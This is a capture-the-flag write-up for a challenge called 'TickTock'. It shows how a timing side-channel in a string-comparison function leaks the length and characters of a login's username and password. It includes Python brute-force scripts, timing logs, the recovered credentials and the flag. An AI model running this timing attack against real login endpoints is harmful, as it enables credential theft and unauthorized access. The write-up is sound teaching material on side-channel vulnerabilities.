# TickTock Writeup

![](images/Pasted%20image%2020221206125100.png)

Given the vulnerable the vulnerable function for the TickTock application, we can see that it is likely that `comparestring()` is being used to check the username and password values.

In the `comparestring()`, we can also see in the section denoted by (1), that if the length of a is not equals the length of b, then it immediately returns. But if it matches, the program sleeps before returning.

This suggests that we make use of the time difference to infer if the length of our provided username/password matches the application's.

Let's do a sanity check. We can do so with the following code snippet
```
import requests
# For checking len of username
for i in range(0, 20):
    val = ("A" * i)
    r = requests.get(f"http://174.138.28.135:30031/flag?username={val}&password=111")
    print(i,r.elapsed.total_seconds())
```

This code essentially tries `A`, `AA` until 20 characters of `A`. And then prints out the following output containing the length and the time elasped for the response.

```
0 0.012312
1 0.010637
2 0.010555
3 0.009346
4 0.009651
5 0.010921
6 0.010992
7 0.010207
8 0.009022
9 0.009504
10 0.111399 < --- more time needed so len of username is 10.
11 0.011147
12 0.009972
13 0.009737
14 0.010169
15 0.010247
16 0.010032
17 0.011412
18 0.010872
19 0.011442
```

From this, we can see that there is a substantial amount of time incurred for length of 10. While comparing with the other timings, it is quite apparent.

As such, we can make use of this basis for enumerating the length of our username and password.

But we need to do this sequentially meaning
```
Find length of username => Find username value => Find password length => Find password value.
```

So,  let's do it sequentially and since we now have the username length, we can take at code again,
![](images/Pasted%20image%2020221206125104.png)

This time we can focus on the code section denoted by (2). In this part of the code, for each of the character in our provided username, it is checked from left to right, whether it matches the current actual password character in the server. And if it matches, it continues checking and incurring additional sleeps each time.

As such, we can perform a binary search due to how the vulnerable functionality provides us with a "pseudo-conditional" check - i.e. less time vs more time, false vs true.

And with that, we can craft the following code snippet that helps us to automate the binary search
```
username = ""
for idx in range(len(username), userlen):
    highestTimeChar = ""
    currHigh = 0.0
    for i in string.ascii_letters + string.digits:
        padding = (userlen - idx - 1) * "A"
        url = f"http://{target}/flag?username={username}{i}{padding}&password=111"
        r = requests.get(url)
        if currHigh < r.elapsed.total_seconds():
            currHigh = r.elapsed.total_seconds()
            highestTimeChar = i
        print(url, i,r.elapsed.total_seconds())
    username += highestTimeChar
print("Username is " + username)
```

> Initially, the `string.ascii_letters + string.digits` was replaced with ascii characters containing `a-zA-Z0-9` and all other special characters. But after obtaining the username, we can see that only alphanumeric values are used. Hence it was changed.

So, this essentially checks from e.g. `XAAAAAAAAA` where `X` are the values from `a-zA-Z0-9`. And this continues for each of the indexes until we see the following output.

```
...
http://174.138.28.135:30031/flag?username=0p3nr4leay&password=111 y 0.565102
http://174.138.28.135:30031/flag?username=0p3nr4leaz&password=111 z 0.565232
http://174.138.28.135:30031/flag?username=0p3nr4lea{&password=111 { 0.563831
http://174.138.28.135:30031/flag?username=0p3nr4lea|&password=111 | 0.565666
http://174.138.28.135:30031/flag?username=0p3nr4lea}&password=111 } 0.562699
Username is 0p3nr4leaf
```

> The additional output containing the full URL payload, attempted character and elasped time. This will allow us to troubleshoot incase, some weird behaviour (in terms of time) happens midway (which did at some point giving the wrong username)

Now, we have the username - `0p3nr4leaf`, and with this basis, we can repeat this attack for the password values.

Finding out the password length, we are able to get 
```
0 0.618353
1 0.616466
2 0.633202
3 0.620295
4 0.614156
5 0.612806
6 0.614233
7 0.632294
8 0.618381
9 0.618171
10 0.615843
11 0.617165
12 0.61816
13 0.616338
14 0.616245
15 0.615591
16 0.614427
17 0.617074
18 0.613451
19 0.614492
20 0.716544 <-- Most time incurred
21 0.619495
22 0.616314
23 0.613904
24 0.616069
25 0.630552
26 0.616242
27 0.61654
28 0.615546
29 0.616117
```

Similarly, we see that for length of 20, it incurs the most time for the response. As such, we know the password length is 20.

Then with the password length, we can perform the same binary search,
```
...
http://157.245.52.169:31121/flag?username=0p3nr4leaf&password=r1g3boj8455871326i3v v 1.669158
http://157.245.52.169:31121/flag?username=0p3nr4leaf&password=r1g3boj8455871326i3w w 1.721742
http://157.245.52.169:31121/flag?username=0p3nr4leaf&password=r1g3boj8455871326i3x x 1.676561
http://157.245.52.169:31121/flag?username=0p3nr4leaf&password=r1g3boj8455871326i3y y 1.682078
http://157.245.52.169:31121/flag?username=0p3nr4leaf&password=r1g3boj8455871326i3z z 1.67329
http://157.245.52.169:31121/flag?username=0p3nr4leaf&password=r1g3boj8455871326i3A A 1.669678
...
http://157.245.52.169:31121/flag?username=0p3nr4leaf&password=r1g3boj8455871326i35 5 1.670786
http://157.245.52.169:31121/flag?username=0p3nr4leaf&password=r1g3boj8455871326i36 6 1.672602
http://157.245.52.169:31121/flag?username=0p3nr4leaf&password=r1g3boj8455871326i37 7 1.673853
http://157.245.52.169:31121/flag?username=0p3nr4leaf&password=r1g3boj8455871326i38 8 1.669289
http://157.245.52.169:31121/flag?username=0p3nr4leaf&password=r1g3boj8455871326i39 9 1.67153
Password is r1g3boj8455871326i3w
Final Credentials
0p3nr4leaf:r1g3boj8455871326i3w
```

And after an extremely painful amount of time, we have the password `r1g3boj8455871326i3w`.

> For the full exploit script, refer to the `Exploit Script` section.

With the credentials, we can login into the application's portal, giving us the flag!
![](images/Pasted%20image%2020221204221521.png)


## Exploit Script

```
import requests
import string

# Replace with your instance target.
target = "157.245.52.169:31121"

userlen = 0
currHigh = 0.0
for i in range(0, 20):
    val = ("A" * i)
    r = requests.get(f"http://{target}/flag?username={val}&password=111")
    if currHigh < r.elapsed.total_seconds():
        currHigh = r.elapsed.total_seconds()
        userlen = i
    print(i,r.elapsed.total_seconds())

username = ""
for idx in range(len(username), userlen):
    highestTimeChar = ""
    currHigh = 0.0
    for i in string.ascii_letters + string.digits:
        padding = (userlen - idx - 1) * "A"
        url = f"http://{target}/flag?username={username}{i}{padding}&password=111"
        r = requests.get(url)
        if currHigh < r.elapsed.total_seconds():
            currHigh = r.elapsed.total_seconds()
            highestTimeChar = i
        print(url, i,r.elapsed.total_seconds())
    username += highestTimeChar

print("Username is " + username)

passlen = 0
currHigh = 0.0
for i in range(0, 30):
    val = ("A" * i)
    r = requests.get(f"http://{target}/flag?username={username}&password={val}")
    if currHigh < r.elapsed.total_seconds():
        currHigh = r.elapsed.total_seconds()
        passlen = i
    print(i,r.elapsed.total_seconds())

password = ""
for idx in range(len(password), passlen):
    highestTimeChar = ""
    currHigh = 0.0
    for i in string.ascii_letters + string.digits:# range(32, 126):
        padding = (passlen - idx - 1) * "A"
        url = f"http://{target}/flag?username={username}&password={password}{i}{padding}"
        r = requests.get(url)
        if currHigh < r.elapsed.total_seconds():
            currHigh = r.elapsed.total_seconds()
            highestTimeChar = i
        print(url, i,r.elapsed.total_seconds())
    password += highestTimeChar

print("Password is " + password)

print("Final Credentials")
print(username + ":" + password)
```

## Flag

```
STF22{Play_OpenRA_d44149ca5ec9b17d}
```